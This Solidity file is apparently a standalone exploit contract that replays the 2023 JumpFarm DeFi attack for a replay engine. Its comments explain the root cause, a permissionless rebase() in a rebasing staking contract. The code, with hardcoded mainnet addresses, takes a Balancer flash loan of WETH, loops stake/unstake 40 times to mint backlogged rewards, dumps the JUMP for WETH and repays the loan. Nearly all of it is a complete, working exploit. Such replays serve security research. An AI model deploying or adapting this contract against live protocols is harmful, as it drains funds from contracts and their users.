// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-09-JumpFarm).
// The DeFiHackLabs-style PoC runs the attack INLINE in the Foundry test
// contract (`JumpFarmExploit` is both the flash-loan initiator via
// testExploit() AND the Balancer flash-loan callback target via
// receiveFlashLoan()), so there is no standalone attack contract to deploy.
// This is a faithful, cheatcode-free copy of that inline attack. Logic and
// constants are copied verbatim from
// evm-hack-registry/2023-09-JumpFarm_exp/test/JumpFarm_exp.sol, with the
// Test-inheritance / vm.label / emit log_named_decimal_uint scaffolding
// dropped (cosmetic / diagnostic only — no cheatcodes execute in the replay
// engine, and the original test used none in the actual attack path).
//
// Root cause: JumpFarm's Staking contract is an OlympusDAO-style rebasing
// staking contract. Both stake() and unstake() call the permissionless
// rebase() first, and rebase() advances one queued epoch (minting fresh
// treasury profit into the contract) every time it is called while the
// contract is behind schedule. By depositing JUMP for sJUMP and immediately
// redeeming it (unstake(..., rebase=true)) in the SAME transaction, the
// attacker fires one backlogged epoch per stake/unstake round-trip and walks
// away with more JUMP than it put in. The attacker loops this stake/unstake
// pair 40 times (hex"28" = 40, encoded in the flash-loan userData byte)
// inside one Balancer flash loan, growing its JUMP holding ~1.74x for free,
// then dumps the free-minted JUMP into the thin JUMP/WETH Uniswap V2 pool for
// a clean WETH profit before repaying the loan.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IStaking {
    function unstake(address _to, uint256 _amount, bool _rebase) external;
    function stake(address _to, uint256 _amount) external;
}

contract JumpFarmDrain {
    IBalancerVault private constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 private constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router private constant router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 private constant jump = IERC20(0x39d8BCb39DE75218E3C08200D95fde3a479D7a14);
    IStaking private constant staking = IStaking(0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9);
    IERC20 private constant sJump = IERC20(0xdd28c9d511a77835505d2fBE0c9779ED39733bdE);

    // Entrypoint. Draws a 15 WETH Balancer flash loan (0 fee) and passes the
    // loop count (40) as the single userData byte.
    function run() external {
        address[] memory token = new address[](1);
        token[0] = address(weth);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 15 * 1 ether;
        balancer.flashLoan(address(this), token, amount, hex"28");
    }

    function receiveFlashLoan(
        address[] memory, /*tokens*/
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        weth.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(jump);
        // Swap the flash-loaned WETH for a starting JUMP stash.
        router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);
        jump.approve(address(staking), type(uint256).max);
        sJump.approve(address(staking), type(uint256).max);

        uint8 i = 0;
        while (i < uint8(userData[0])) {
            i += 1;
            // The bug: stake() then immediately unstake(rebase=true) in the
            // same transaction. Each call fires a permissionless rebase()
            // that mints backlogged epoch profit into the Staking contract,
            // and the attacker (functionally the only holder) redeems more
            // JUMP than it deposited every round trip.
            uint256 amountJump = jump.balanceOf(address(this));
            staking.stake(address(this), amountJump);
            uint256 amountSJump = sJump.balanceOf(address(this));
            staking.unstake(address(this), amountSJump, true);
        }

        jump.approve(address(router), type(uint256).max);
        uint256 amount = jump.balanceOf(address(this));

        path[0] = address(jump);
        path[1] = address(weth);
        // Dump the free-minted JUMP into the thin JUMP/WETH pool for WETH.
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
        // Repay the flash loan; whatever WETH remains is the profit.
        weth.transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }
}
